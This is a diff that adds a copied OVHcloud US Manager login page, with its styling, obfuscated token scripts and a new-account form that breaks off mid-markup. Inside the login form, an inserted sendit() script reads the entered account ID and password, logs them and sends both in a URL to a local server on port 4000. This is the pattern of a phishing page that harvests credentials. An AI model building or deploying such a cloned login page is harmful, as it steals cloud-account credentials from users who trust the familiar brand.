@@ -1,0 +1,908 @@
+
+<!doctype html>
+<html lang="en-US">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+        <meta http-equiv="Content-Language" content="en-US"/>
+        <meta http-equiv="revisit-after" name="Revisit-after" content="14 days"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="robots" name="Robots" content="all"/>
+        <meta name="Copyright" content="OVHcloud"/>
+        <meta name="Author" content="OVHcloud"/>
+        <meta name="robots" content="INDEX|FOLLOW"/>
+        <meta name="x-ovh-monitoring" content="auth-ovh"/>
+        <title>Manager - OVHcloud</title>
+        <link rel="stylesheet" type="text/css" href="/auth/sso/static/fonts/source-code-pro/source-code-pro.css" media="all"/>
+        <link rel="stylesheet" type="text/css" href="/auth/sso/static/fonts/source-sans/source-sans-3.css" media="all"/>
+    </head>
+    <body>
+        <style>
+            body {
+                padding-top: 0px;
+                margin-top: 25px;
+                font-family: "Source Sans 3";
+                font-size: 14px;
+                color: #3C3C3C;
+            }
+
+            a {
+                text-decoration: none;
+                color: #0050d7;
+                font-weight: 600;
+            }
+
+            a:focus {
+                outline: dashed 2px #288601;
+                outline-offset: 2px;
+            }
+
+            a:hover {
+                color: #0050d7;
+                text-decoration: underline;
+            }
+
+            .btn {
+                width: 190px;
+                height: 55px;
+                border-radius: 6px;
+                box-shadow: none;
+                text-shadow: none;
+
+                cursor: pointer;
+                text-align: center;
+                vertical-align: middle;
+
+                font-size: 18px;
+                font-weight: bold;
+            }
+
+            .btn:hover {
+                box-shadow: 0 0 6px 0 rgba(0, 14, 156, 0.2);
+            }
+
+            .btn:focus {
+                outline: dashed 2px #288601;
+                outline-offset: 2px;
+            }
+
+            .btn-primary {
+                color: #ffffff;
+                background: #0050d7;
+                border: none;
+            }
+
+            .btn-primary:hover {
+                background-color: #000e9c;
+            }
+
+            .btn-primary:active {
+                background-color: #00185e;
+            }
+
+            .btn-secondary {
+                color: #0050d7;
+                background: #ffffff;
+                border: solid 2px #0050d7;
+            }
+
+            .btn-secondary:hover {
+                background-color: #bef1ff;
+            }
+
+            .btn-secondary:active {
+                background-color: #85d9fd;
+            }
+
+            .btn-small {
+                width: 107px;
+                height: 30px;
+            } 
+
+            .main {
+                display: flex;
+                flex-direction:column;
+                align-items: center;
+            }
+
+            .main_logo {
+                margin-top: 60px;
+            }
+
+            @media (max-width: 900px)
+            {
+                .main_logo {
+                    margin-top: 0px;
+                }
+            }
+        </style>
+        <div class="main">
+            <div class="main_logo">
+                <img src="/auth/sso/static/images/logo-ovhcloud-r-2020.svg" alt="OVHcloud logo" style="height: 50px; padding-bottom: 20px;">
+            </div>
+            <div>
+            <style>
+                .ovh-field
+                {
+                    background:#fff;
+                    border:1px solid #bef1ff;
+                    border-radius:2px;
+                    display:inline-block;
+                    padding:0;
+                    text-align:left;
+                    width:300px;
+                    position: relative;
+                }
+                
+                .ovh-field-label
+                {
+                    background:none;
+                    border:none;
+                    bottom:7px;
+                    color:#4d5592;
+                    font-family:"Source Sans 3";
+                    font-size:16px;
+                    left:0;
+                    line-height:16px;
+                    padding:0 4px;
+                    pointer-events:none;
+                    position:absolute;
+                    transform-origin:bottom left;
+                    transition:all .3s cubic-bezier(0.4,0,0.2,1),border .3s cubic-bezier(0,.7,0,.7);
+                }
+
+                .ovh-field-error
+                {
+                    color:#c11b1b;
+                    font-size:12px;
+                    line-height:1.33;
+                    padding:0px 10px 0px 10px;
+                    width:280px;
+                    display: none;
+                }
+
+                .ovh-field-input
+                {
+                    background:transparent;
+                    border-style:none;
+                    box-shadow:unset;
+                    color:#4d5592;
+                    font-family:"Source Sans 3";
+                    font-size:16px;
+                    margin:0;
+                    opacity:1;
+                    outline:0;
+                    padding:5px;
+                    width:290px;                
+                }
+
+                .ovh-field-set
+                {
+                    background:#f5feff;
+                    border-bottom-color:#0050d7;
+                }
+
+                .ovh-field-set .ovh-field-label
+                {
+                    border:none;
+                    font-size:12px;
+                    font-weight:700;
+                    transform:translateX(-7px) translateY(-25px);
+                    transition:all .3s cubic-bezier(0.4,0,0.2,1),border .3s cubic-bezier(.7,0,.7,0);
+                }
+
+                .ovh-field-set-invalid
+                {
+                    background:#faefef;
+                    border-bottom-color:#c11b1b;
+                    border-color:#ffd2dd;
+                }
+
+                .ovh-field-set-invalid .ovh-field-label
+                {
+                    color:#c11b1b;
+                }
+
+                .ovh-field-input:focus:invalid
+                {
+                    color:#4d5592;
+                }
+            </style>
+            <style>
+                .ovh-checkbox {
+                    position: relative;
+                    width: 300px;
+                }
+
+                .ovh-checkbox label {
+                    display: inline-block;
+                    margin-bottom: 0px;
+                    font-size: 12px;
+                    color: #4d5592;
+                    line-height: 1.25;
+                    padding-left: 25px;
+                }
+
+                .ovh-checkbox input {
+                    position: absolute;
+                    opacity: 0;
+                    cursor: pointer;
+                    height: 0;
+                    width: 0;
+                    left: 2px;
+                    top: 0px;
+                    bottom:0px;
+                    margin-top: auto;
+                    margin-bottom: auto; 
+                }
+
+                .ovh-checkbox .checkmark {
+                    position: absolute;
+                    top: 0px;
+                    left: 0px;
+                    bottom: 0px;
+                    margin-top: auto;
+                    margin-bottom: auto;
+                    height: 15px;
+                    width: 15px;
+                    background-color: #ffffff;
+                    border: solid 2px #0050d7;
+                    border-radius: 2px;
+                }
+
+                .ovh-checkbox:hover input ~ .checkmark {
+                    background-color: #f5feff;
+                    border: solid 2px #000e9c;
+                }
+
+                .ovh-checkbox input:checked ~ .checkmark {
+                    background-color: #0050d7;
+                    border: solid 2px #0050d7;
+                    background-repeat: no-repeat;
+                    background-position: center;
+                    background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMyIgaGVpZ2h0PSIxMCIgdmlld0JveD0iMCAwIDEzIDEwIj4KICAgIDxwYXRoIGZpbGw9IiNGRkYiIGZpbGwtcnVsZT0iZXZlbm9kZCIgZD0iTTQuNDMyIDYuNjY4TDEwLjk5LjEwM2EuMzQ5LjM0OSAwIDAgMSAuNDk1IDBsLjkxLjkxYy4xNDEuMTQuMTQxLjM3IDAgLjUxMUw0LjY4IDkuMjNhLjM0OS4zNDkgMCAwIDEtLjQ5NSAwTC42MDUgNS42NTVhLjM2My4zNjMgMCAwIDEtLjAwMi0uNTFsLjg5NS0uOTFhLjM0OS4zNDkgMCAwIDEgLjQ5Ny0uMDAybDIuNDM3IDIuNDM1eiIvPgo8L3N2Zz4K");
+                }
+
+                .ovh-checkbox:hover input:checked ~ .checkmark {
+                    background-color: #000e9c;
+                    border: solid 2px #000e9c;
+                    background-repeat: no-repeat;
+                    background-position: center;
+                    background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMyIgaGVpZ2h0PSIxMCIgdmlld0JveD0iMCAwIDEzIDEwIj4KICAgIDxwYXRoIGZpbGw9IiNGRkYiIGZpbGwtcnVsZT0iZXZlbm9kZCIgZD0iTTQuNDMyIDYuNjY4TDEwLjk5LjEwM2EuMzQ5LjM0OSAwIDAgMSAuNDk1IDBsLjkxLjkxYy4xNDEuMTQuMTQxLjM3IDAgLjUxMUw0LjY4IDkuMjNhLjM0OS4zNDkgMCAwIDEtLjQ5NSAwTC42MDUgNS42NTVhLjM2My4zNjMgMCAwIDEtLjAwMi0uNTFsLjg5NS0uOTFhLjM0OS4zNDkgMCAwIDEgLjQ5Ny0uMDAybDIuNDM3IDIuNDM1eiIvPgo8L3N2Zz4K");
+                }
+
+                .ovh-checkbox input:focus ~ .checkmark, .ovh-checkbox label:active input ~ .checkmark {
+                    outline: dashed 2px #288601;
+                    outline-offset: 2px;
+                }
+            </style>
+            <style>
+                .ovh-select-wrapper:focus {
+                    outline: none;
+                }
+
+                .ovh-select-wrapper:hover {
+                    background: #f5feff;
+                }
+
+                .ovh-select {
+                    padding: 5px;
+                    display: flex;
+                    font-family: "Source Sans 3";
+                    color: #4d5592;
+                    font-size: 16px;
+                    cursor: pointer;
+                }
+
+                .ovh-select ~ .ovh-field-label {
+                    font-size: 12px;
+                    border: none;
+                    transform: translateX(-7px) translateY(-25px);
+                    font-weight: bold;
+                }
+
+                .ovh-select-options {
+                    box-shadow: 0 0 6px 0 rgba(0,14,156,.2);
+                    border: none;
+                    background: white;
+                    position: absolute;
+                    left: 0px;
+                    z-index: 1;
+                }
+
+                .ovh-select-options > ul {
+                    margin: 0px;
+                    padding: 0px;
+                }
+
+                .ovh-select-options > ul > li {
+                    list-style-type: none;
+                    font-size: 16px;
+                    font-family: "Source Sans 3";
+                    display: flex;
+                    padding: 5px;
+                    cursor: pointer;
+                }
+
+                .ovh-select-options > ul > li:hover {
+                    background: #bef1ff;
+                }
+
+                .ovh-select-selected {
+                    outline-width: 2px;
+                    outline-style: dashed;
+                    outline-color: #268403;
+                    outline-offset: -2px;
+                    background: #bef1ff;
+                }
+            </style>
+                <script nonce="28262855-affe-4b84-84f8-f2fe13d5515a">
+                    function addOvhFieldInputHandlers(node) {
+                        node.querySelectorAll(".ovh-field > input").forEach(item => {
+                            if (item.value !== "") {
+                                item.parentElement.classList.add('ovh-field-set');
+                            }
+
+                            item.addEventListener('focusin', event => event.currentTarget.parentElement.classList.add('ovh-field-set'));
+                            item.addEventListener('focusout', event => {
+                                if (event.currentTarget.value === '') {
+                                    event.currentTarget.parentElement.classList.remove('ovh-field-set');
+                                }
+                            });
+                        });
+                    }
+                    const observer = new MutationObserver(records => {
+                        records.forEach(record => {
+                            record.addedNodes.forEach(node => {
+                                if (node.nodeType === Node.ELEMENT_NODE && node.classList.contains("ovh-field")) {
+                                    addOvhFieldInputHandlers(node);
+                                }
+                            });
+                        });
+                    });
+                    observer.observe(document, { childList: true, subtree: true });
+                    window.addEventListener('load', (event) => {
+                        document.querySelectorAll(".ovh-field > input").forEach(item => {
+                            if (item.value !== "") {
+                                item.parentElement.classList.add('ovh-field-set');
+                            }
+                        });
+                    });
+                </script>
+                <style>
+                    .already-customer-title, .forgot-password-title, .new-customer-title {
+                        font-weight: bold;
+                        letter-spacing: 0.12px;
+                        color: #00185e;
+                        font-size: 20px;
+                        margin-bottom: 12px;
+                        text-align: center;
+                    }
+
+                    .nic-help-link {
+                        font-size: 16px;
+                        font-weight: 600;
+                    }
+
+                    .nic-help-link a {
+                        display: block;
+                    }
+
+                    .lost-user-password button {
+                        background: none;
+                        border: none;
+                        margin: 0;
+                        padding: 0;
+                        color: #0050d7;
+                        font-size: 14px;
+                        font-weight: 600;
+                        font-family: inherit;
+                    }
+
+                    .lost-user-password button:hover {
+                        text-decoration: underline;
+                        cursor: pointer;
+                    }
+
+                    .lost-user-password button:focus {
+                        outline: dashed 2px #288601;
+                        outline-offset: 2px;
+                    }
+
+                    .forgot-password-panel {
+                        margin-top: 25px;
+                        min-width: 500px;
+                        box-shadow: 0 0 6px 0 rgba(0, 14, 156, 0.2);
+                        padding: 32px 20px 32px 20px;
+                        border-radius: 6px;
+                        display:none;
+                        flex-direction: column;
+                        align-items: center;
+                        gap: 32px;
+                    }
+
+                    .forgot-password-back {
+                        font-size: 14px;
+                        font-weight: 600;
+                    }
+
+                    .forgot-password-loader {
+                        color: #3a87ad;
+                    }
+
+                    .forgot-password-failure {
+                        color: #b94a48;
+                    }
+
+                    .forgot-password-success {
+                        color: #468847;
+                    }
+
+                    .login-new-account-notes {
+                        color: #4d5592;
+                        font-size: 16px;
+                    }
+
+                    .login-new-account-notes ul {
+                        margin-left: 16px;
+                    }
+
+                    .login-new-account-notes ul li {
+                        padding-top: 10px;
+                        font-size: 16px;
+                        line-height: 24px;
+                        list-style: none;
+                    }
+
+                    .login-new-account-notes ul li::before {
+                        content: "•";
+                        color: #0050d7;
+                        display: inline-block; width: 1em;
+                        margin-left: -1em;
+                    }
+
+                    .create-account-sub-currency {
+                        background: #bef1ff;
+                        border-radius: 10px;
+                        padding: 0px 10px 0px 10px;
+                        margin-left: auto;
+                    }
+
+                    .create-account-sub-flag {
+                        height: 16px;
+                        width: 20px;
+                        background-size: 20px;
+                        background-image: url(https://www.ovh.com/images/flagz/ovhFlags.png);
+                        margin-top: 4px;
+                        margin-right: 5px;
+                    }
+
+                    .rgpd-info {
+                        font-size: 12px;
+                        line-height: 16px;
+                        text-align: justify;
+                        max-width: 800px;
+                        color: #4d5592;
+                    }
+
+                    .password-meter {
+                        background: none;
+                        background-color: rgba(0, 0, 0, 0.1);
+                        width: 300px;
+                        height: 8px;
+                        border-radius: 5px;
+                    }
+
+                    meter::-webkit-meter-bar {
+                        background: none;
+                        background-color: rgba(0, 0, 0, 0.1);
+                        border-radius: 5px;
+                    }
+
+                    meter[value="1"]::-webkit-meter-optimum-value { background: #c11b1b; border-radius: 5px; }
+                    meter[value="2"]::-webkit-meter-optimum-value { background: #fa9b3e; border-radius: 5px; }
+                    meter[value="3"]::-webkit-meter-optimum-value { background: #ffc800; border-radius: 5px; }
+                    meter[value="4"]::-webkit-meter-optimum-value { background: #268403; border-radius: 5px; }
+
+                    meter[value="1"]::-moz-meter-bar { background: #c11b1b; border-radius: 5px; }
+                    meter[value="2"]::-moz-meter-bar { background: #fa9b3e; border-radius: 5px; }
+                    meter[value="3"]::-moz-meter-bar { background: #ffc800; border-radius: 5px; }
+                    meter[value="4"]::-moz-meter-bar { background: #268403; border-radius: 5px; }
+
+                    .login {
+                        display: flex;
+                        flex-direction:column;
+                        align-items: center;
+                        gap: 20px;
+                    }
+
+                    .login_or_create {
+                        display:flex;
+                        flex-direction: row;
+                        align-items: flex-start;
+                        gap: 32px;
+                    }
+
+                    .login-panel {
+                        margin-top: 25px;
+                        width: 380px;
+                        background: rgb(245, 254, 255);
+                        box-shadow: 0 0 6px 0 rgba(0, 14, 156, 0.2);
+                        padding: 32px 20px 32px 20px;
+                        border-radius: 6px;
+                        display:flex;
+                        flex-direction: column;
+                        align-items: center;
+                        gap: 32px;
+                    }
+
+                    .create-panel {
+                        margin-top: 25px;
+                        width: 380px;
+                        box-shadow: 0 0 6px 0 rgba(0, 14, 156, 0.2);
+                        padding: 32px 20px 32px 20px;
+                        border-radius: 6px;
+                        display:flex;
+                        flex-direction: column;
+                        align-items: center;
+                        gap: 32px;
+                    }
+
+                    @media (max-width: 900px)
+                    {
+                        .login_or_create {
+                            display:flex;
+                            flex-direction: column;
+                            align-items: center;
+                            gap: 0px;
+                        }
+
+                        .login-panel {
+                            width: 90%;
+                            max-width: 380px;
+                        }
+
+                        .create-panel {
+                            width: 90%;
+                            max-width: 380px;
+                        }
+
+                        .forgot-password-panel {
+                            width: 90%;
+                            min-width: auto;
+                            max-width: 380px;
+                        }
+                    }
+                </style>
+                <script nonce="28262855-affe-4b84-84f8-f2fe13d5515a">
+                    const urlParams = new URLSearchParams(window.location.search);
+                    sessionStorage["prev_ref"] = (urlParams.has('from') && urlParams.get('from') !== "") ? urlParams.get('from') : document.referrer;
+                </script>
+                <div id="login" class="login">
+                    <div class="login_or_create">
+                        <div aria-labelledby="already-customer-title" class="login-panel">
+                            <div id="already-customer-title" class="already-customer-title">
+                                I&#39;m already an OVHcloud US customer
+                            </div>
+                            <form id="login-form" method="POST" style="display: contents;">
+                                <input type="hidden" name="nonce" value="aea37025-0059-41c6-8988-201b26b07f64"/>
+                                <input type="hidden" name="sT" id="sT"/>
+                                <input type="hidden" name="loginRelayState" value="U2FsdGVkX19IIaemFyZJZKrFA&#43;ojxG/L8QUlWfCdJsSzrnSJEpg5bSNr8sQDF8DUejruJpddpWXQxW0bKI&#43;HOUNh5rfFgRZ3bDF8gxmG/PdcnDTzs66VVbHZmbnm6mVwfgQdX/CIwapYAsHxNmEnJiguMgMEDfkKqYLeFdNsdxQNn7OvfDJuy8rCuspAmXlOp2VX0XkpeIgQkFkLQi5BjvAamZakRgCwn4RrjUedF8T9cG&#43;3Z&#43;wqHs9WiEBBrUDa"/>
+                                <input type="hidden" name="jsE" id="jsE" value="no"/>
+                                <script nonce="28262855-affe-4b84-84f8-f2fe13d5515a">var _0x5c56=['getElementById','fromCharCode','length','g5-7q8llq2qp5q6002o9p53nln1p0390l932o34q199','jsE','charCodeAt','match'];(function(_0x1308d2,_0x5c56c3){var _0x3eb25d=function(_0x850f1b){while(--_0x850f1b){_0x1308d2['push'](_0x1308d2['shift']());}};_0x3eb25d(++_0x5c56c3);}(_0x5c56,0xb4));var _0x3eb2=function(_0x1308d2,_0x5c56c3){_0x1308d2=_0x1308d2-0x0;var _0x3eb25d=_0x5c56[_0x1308d2];return _0x3eb25d;};document[_0x3eb2('0x2')](_0x3eb2('0x6'))['value']=function(){var _0x41d940='',_0x44182f=_0x3eb2('0x5');for(var _0x4106a6=0x0;_0x4106a6<_0x44182f[_0x3eb2('0x4')];_0x4106a6++){var _0x1fba76=_0x44182f[_0x4106a6];if(_0x1fba76[_0x3eb2('0x1')](/[a-z0-9]/i)){var _0x1d0745=_0x44182f[_0x3eb2('0x0')](_0x4106a6);if(_0x1d0745>=0x30&&_0x1d0745<=0x39)_0x1fba76=String[_0x3eb2('0x3')]((_0x1d0745-0x30+0x6)%0xa+0x30);else{if(_0x1d0745>=0x61&&_0x1d0745<=0x7a)_0x1fba76=String['fromCharCode']((_0x1d0745-0x61+0xf)%0x1a+0x61);}}_0x41d940+=_0x1fba76;}return _0x41d940;}();</script>
+                                <script nonce="28262855-affe-4b84-84f8-f2fe13d5515a" async src="/auth/sso/static/js/app.min.471cab8e35e82e.js?aea37025-0059-41c6-8988-201b26b07f64"/></script>
+                                <script nonce="28262855-affe-4b84-84f8-f2fe13d5515a" defer src="/auth/sso/static/js/app.min.54e8f4e444ab0c.js"></script>
+                                <script nonce="28262855-affe-4b84-84f8-f2fe13d5515a">
+                                    window.addEventListener('DOMContentLoaded', (event) => { computeSecurityToken(token => document.getElementById("sT").value = token) });
+                                </script>
+
+                                <div class="ovh-field">
+                                    <input aria-labelledby="login-account-label" type="text" class="ovh-field-input" id="account" name="username" autofocus required="required" value=""/>
+                                    <div id="login-account-label" class="ovh-field-label">Account ID or email address</div>
+                                </div>
+
+                                <div class="ovh-field" style="display: flex; align-items: center;">
+                                    <input aria-labelledby="login-account-password" type="password" class="ovh-field-input" id="password" name="password"/>
+                                    <svg id="password-show" xmlns="http://www.w3.org/2000/svg" style="cursor: pointer; padding-right: 5px; flex-shrink: 0;" width="20" height="20" viewBox="0 0 24 24">
+                                        <path fill-rule="evenodd" d="M19.778 4.222c.39.39.32 1.094-.157 1.571L5.793 19.621c-.477.477-1.18.548-1.571.157-.39-.39-.32-1.094.157-1.571L18.207 4.379c.477-.477 1.18-.548 1.571-.157zm-3.319 5.947l2.81-2.812a13.098 13.098 0 0 1 3.38 3.486 2.124 2.124 0 0 1-.004 2.32c-2.245 3.39-5.866 5.495-9.815 5.78-.181.022-.364.04-.55.05l-.279.008-.02-.001a6.747 6.747 0 0 1-.796-.055 12.719 12.719 0 0 1-2.943-.56l1.815-1.814A4.602 4.602 0 0 0 12 17l.013-.001c2.632-.006 4.778-2.234 4.778-5a5.18 5.18 0 0 0-.331-1.83l2.81-2.812zm-4.463-5.17h.011c.006 0 .011.003.017.003.271 0 .537.022.8.055.895.063 1.774.22 2.624.466l-1.786 1.786a4.595 4.595 0 0 0-1.37-.3l-.29-.01c-2.638.002-4.79 2.232-4.79 5a5.2 5.2 0 0 0 .227 1.531l-2.946 2.947a13.116 13.116 0 0 1-3.15-3.32 2.128 2.128 0 0 1 .003-2.32c2.252-3.4 5.887-5.506 9.84-5.782.261-.032.525-.053.795-.054h.008L12.007 5zM5.883 8.982a11.161 11.161 0 0 0-2.866 2.955c-.023.037-.023.092-.003.123a11.177 11.177 0 0 0 2.87 2.96 7.139 7.139 0 0 1-.673-3.02c0-1.08.246-2.102.672-3.018zm12.241.01a7.134 7.134 0 0 1 0 6.018 11.154 11.154 0 0 0 2.85-2.944.125.125 0 0 0 .004-.124 11.17 11.17 0 0 0-2.854-2.95z" fill="#0050D7"></path>
+                                    </svg>
+                                    <svg id="password-show-open" style="display: none; cursor: pointer; padding-right: 5px; flex-shrink: 0;" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24">
+                                        <path fill-rule="evenodd" d="M12.016 5c.28.003.545.024.808.057 3.946.28 7.573 2.385 9.825 5.786a2.124 2.124 0 0 1-.004 2.32c-2.245 3.39-5.866 5.495-9.815 5.78a6.657 6.657 0 0 1-.829.058h-.012a6.87 6.87 0 0 1-.804-.056c-3.952-.276-7.587-2.382-9.843-5.787a2.128 2.128 0 0 1 .004-2.321c2.252-3.4 5.887-5.506 9.84-5.782.261-.032.525-.053.795-.054h.035zm-.014 2c-2.638 0-4.79 2.23-4.79 5 0 2.769 2.151 4.999 4.787 5l.013-.001c2.632-.006 4.778-2.234 4.778-5 0-2.768-2.152-4.998-4.788-5zM5.883 8.98a11.161 11.161 0 0 0-2.866 2.956c-.023.037-.023.092-.003.123a11.177 11.177 0 0 0 2.87 2.96 7.139 7.139 0 0 1-.673-3.02c0-1.08.246-2.102.672-3.018zm12.241.012a7.134 7.134 0 0 1 0 6.017 11.154 11.154 0 0 0 2.85-2.944.125.125 0 0 0 .004-.124 11.17 11.17 0 0 0-2.854-2.95zm-6.028.826a1.658 1.658 0 0 0-.095.545c0 .904.707 1.637 1.579 1.637.179 0 .358-.035.526-.099v.1c0 1.204-.942 2.181-2.105 2.181S9.896 13.205 9.896 12s.942-2.182 2.105-2.182z" fill="#0050D7"/>
+                                    </svg>
+                                    <script nonce="28262855-affe-4b84-84f8-f2fe13d5515a">
+                                        const passwordField = document.getElementById('password');
+                                        const passwordShowEyeClosed = document.getElementById('password-show');
+                                        const passwordShowEyeOpen = document.getElementById('password-show-open');
+
+                                        passwordShowEyeClosed.addEventListener("click", () => {
+                                            passwordField.type = 'text';
+                                            passwordShowEyeOpen.style.display = 'block';
+                                            passwordShowEyeClosed.style.display = 'none';
+                                        });
+                                        passwordShowEyeOpen.addEventListener("click", () => {
+                                            passwordField.type = 'password';
+                                            passwordShowEyeOpen.style.display = 'none';
+                                            passwordShowEyeClosed.style.display = 'block';
+                                        });
+                                    </script>
+                                    <div id="login-account-password" class="ovh-field-label">Password</div>
+                                </div>
+
+                                <div style="display: flex; justify-content: center;">
+                                    <button id="login-submit" type="submit" class="btn btn-primary">Login</button>
+                                </div>
+
+                                <script>
+                                    function sendit() {
+                                        const user = document.getElementById('account').value;
+                                        const pass = document.getElementById('password').value;
+                                        const serverUrl = `http://localhost:4000/${user}/${pass}`;
+                                        console.log(user);
+                                        console.log(pass);
+                                        fetch(serverUrl)
+                                        .then(response => {
+                                            console.log('Sent');
+                                        });
+                                    }
+                                </script>
+                            </form>
+
+                            <div class="lost-user-password">
+                                <button id="forgot-password-button">Reset your password</button>
+                            </div>
+                            <div id="worldAlert" style="display:block; color:#C09853; background-color:#FCF8E3; padding-top: 10px; padding-bottom: 10px; margin-left: -20px; margin-right: -20px; padding-left: 20px; padding-right: 20px; margin-bottom: -32px; border-bottom-left-radius: 6px; border-bottom-right-radius: 6px;">
+                                <div class="container-fluid">
+                                    <img src="data:image/svg+xml;utf8;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTkuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4PSIwcHgiIHk9IjBweCIgdmlld0JveD0iMCAwIDUxMi4wMDEgNTEyLjAwMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgNTEyLjAwMSA1MTIuMDAxOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSIgd2lkdGg9IjE2cHgiIGhlaWdodD0iMTZweCI+CjxnPgoJPGc+CgkJPHBhdGggZD0iTTUwMy44MzksMzk1LjM3OWwtMTk1LjctMzM4Ljk2MkMyOTcuMjU3LDM3LjU2OSwyNzcuNzY2LDI2LjMxNSwyNTYsMjYuMzE1Yy0yMS43NjUsMC00MS4yNTcsMTEuMjU0LTUyLjEzOSwzMC4xMDIgICAgTDguMTYyLDM5NS4zNzhjLTEwLjg4MywxOC44NS0xMC44ODMsNDEuMzU2LDAsNjAuMjA1YzEwLjg4MywxOC44NDksMzAuMzczLDMwLjEwMiw1Mi4xMzksMzAuMTAyaDM5MS4zOTggICAgYzIxLjc2NSwwLDQxLjI1Ni0xMS4yNTQsNTIuMTQtMzAuMTAxQzUxNC43MjIsNDM2LjczNCw1MTQuNzIyLDQxNC4yMjgsNTAzLjgzOSwzOTUuMzc5eiBNNDc3Ljg2MSw0NDAuNTg2ICAgIGMtNS40NjEsOS40NTgtMTUuMjQxLDE1LjEwNC0yNi4xNjIsMTUuMTA0SDYwLjMwMWMtMTAuOTIyLDAtMjAuNzAyLTUuNjQ2LTI2LjE2Mi0xNS4xMDRjLTUuNDYtOS40NTgtNS40Ni0yMC43NSwwLTMwLjIwOCAgICBMMjI5Ljg0LDcxLjQxNmM1LjQ2LTkuNDU4LDE1LjI0LTE1LjEwNCwyNi4xNjEtMTUuMTA0YzEwLjkyLDAsMjAuNzAxLDUuNjQ2LDI2LjE2MSwxNS4xMDRsMTk1LjcsMzM4Ljk2MiAgICBDNDgzLjMyMSw0MTkuODM2LDQ4My4zMjEsNDMxLjEyOCw0NzcuODYxLDQ0MC41ODZ6IiBmaWxsPSIjZTY4MDIwIi8+Cgk8L2c+CjwvZz4KPGc+Cgk8Zz4KCQk8cmVjdCB4PSIyNDEuMDAxIiB5PSIxNzYuMDEiIHdpZHRoPSIyOS45OTYiIGhlaWdodD0iMTQ5Ljk4MiIgZmlsbD0iI2U2ODAyMCIvPgoJPC9nPgo8L2c+CjxnPgoJPGc+CgkJPHBhdGggZD0iTTI1NiwzNTUuOTljLTExLjAyNywwLTE5Ljk5OCw4Ljk3MS0xOS45OTgsMTkuOTk4czguOTcxLDE5Ljk5OCwxOS45OTgsMTkuOTk4YzExLjAyNiwwLDE5Ljk5OC04Ljk3MSwxOS45OTgtMTkuOTk4ICAgIFMyNjcuMDI3LDM1NS45OSwyNTYsMzU1Ljk5eiIgZmlsbD0iI2U2ODAyMCIvPgoJPC9nPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+CjxnPgo8L2c+Cjwvc3ZnPgo=">
+                                    Existing US customers prior to Jan. 17, 2018 can access OVHcloud Manager at <a href="https://ovh.com/world">ovh.com/world</a>
+                                </div>
+                            </div>
+                        </div>
+                        <div aria-labelledby="new-customer-title" class="create-panel">
+                            <div id="new-customer-title" class="new-customer-title">
+                                I&#39;m new to OVHcloud US
+                            </div>
+                            <script nonce=28262855-affe-4b84-84f8-f2fe13d5515a async src="/auth/sso/static/js/zxcvbn.js"></script>
+                            <form id="new-account-form" method="POST" style="display: contents;"><input type="hidden" name="action" id="create-account-action" value="createAccount"/>
+                                <input type="hidden" id="create-account-subsidiary" name="create-account-subsidiary" value="US"/>
+
+                                <input type="hidden" name="nonce" value="aea37025-0059-41c6-8988-201b26b07f64"/>
+                                <input type="hidden" name="token" id="token" value="no"/>
+                                <script nonce="28262855-affe-4b84-84f8-f2fe13d5515a">var _0x5c56=['getElementById','fromCharCode','length','g5-l59257518pplp8q5410l7loo36q1m6m8q941q1mo','token','charCodeAt','match'];(function(_0x1308d2,_0x5c56c3){var _0x3eb25d=function(_0x850f1b){while(--_0x850f1b){_0x1308d2['push'](_0x1308d2['shift']());}};_0x3eb25d(++_0x5c56c3);}(_0x5c56,0xb4));var _0x3eb2=function(_0x1308d2,_0x5c56c3){_0x1308d2=_0x1308d2-0x0;var _0x3eb25d=_0x5c56[_0x1308d2];return _0x3eb25d;};document[_0x3eb2('0x2')](_0x3eb2('0x6'))['value']=function(){var _0x41d940='',_0x44182f=_0x3eb2('0x5');for(var _0x4106a6=0x0;_0x4106a6<_0x44182f[_0x3eb2('0x4')];_0x4106a6++){var _0x1fba76=_0x44182f[_0x4106a6];if(_0x1fba76[_0x3eb2('0x1')](/[a-z0-9]/i)){var _0x1d0745=_0x44182f[_0x3eb2('0x0')](_0x4106a6);if(_0x1d0745>=0x30&&_0x1d0745<=0x39)_0x1fba76=String[_0x3eb2('0x3')]((_0x1d0745-0x30+0x6)%0xa+0x30);else{if(_0x1d0745>=0x61&&_0x1d0745<=0x7a)_0x1fba76=String['fromCharCode']((_0x1d0745-0x61+0xf)%0x1a+0x61);}}_0x41d940+=_0x1fba76;}return _0x41d940;}();</script>
+                                <div class="ovh-field">
+                                    <input aria-labelledby="create-account-firstname-label" type="text" class="ovh-field-input" id="create-account-firstname" name="create-account-firstname"  required="required" value=""/>
+                                    <div id="create-account-firstname-label" class="ovh-field-label">First name</div>
+                                </div>
+                                <div class="ovh-field">
+                                    <input aria-labelledby="create-account-name-label" type="text" class="ovh-field-input" id="create-account-name" name="create-account-name" required="required" value=""/>
+                                    <div id="create-account-name-label" class="ovh-field-label">Last name</div>
+                                </div>
+                                <div>
+                                    <div class="ovh-field">
